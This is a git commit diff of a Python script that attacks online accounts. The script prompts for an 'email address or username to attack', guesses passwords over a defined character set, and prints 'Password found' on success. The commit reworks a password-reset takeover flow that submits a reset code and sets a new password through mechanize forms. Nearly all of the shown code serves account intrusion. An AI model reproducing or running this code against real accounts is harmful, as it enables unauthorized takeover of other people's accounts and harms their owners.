7caed97f3d2b962a7548dda4d1241e69644f820f
krarktel <52972778+krarktel@users.noreply.github.com>
2024-08-22 10:51:45 -0400

    Update Test1.py

--- Test1.py
+++ Test1.py
@@ -4,6 +4,8 @@ from time import sleep
 from bs4 import BeautifulSoup
 import mechanize
 
+CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
               'Chrome/7.0.517.41 Safari/534.7' 
@@ -42,8 +44,6 @@ def try_password(self, email, password):
         print ('Password found: %s' % password )
         sys.exit()
 
-CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
 """password = input('Password:')"""
@@ -65,23 +65,18 @@ browser.select_form(nr=0)
 browser.submit()
 browser.select_form(nr=0)
 browser.submit()
-z = soup.find(string='6 characters long')
-print(soup.find(string='6 characters long'))
-h = soup.find(string='8 characters long')
-print(soup.find(string='8 characters long'))
-print(z)
-print(h)
+forms = list(browser.forms())
+form = forms[0]
+print(form)
+y = input('Continue? 1,2, else:')
+"""reset code input"""
+reset = input('Code: ')
 browser.form['n'] = reset
 browser.submit()
-
 """new password"""
 new = input('New Password: ')
 browser.select_form(nr=0)
 browser.select_form(nr=0)
 browser.form['password_new'] = new
 browser.form.set_value(reset, nr=2)
-y = input('Continue? 1,2, else:')
-"""reset code input"""
-reset = input('Code: ')
 soup.find(string='password_new')
-
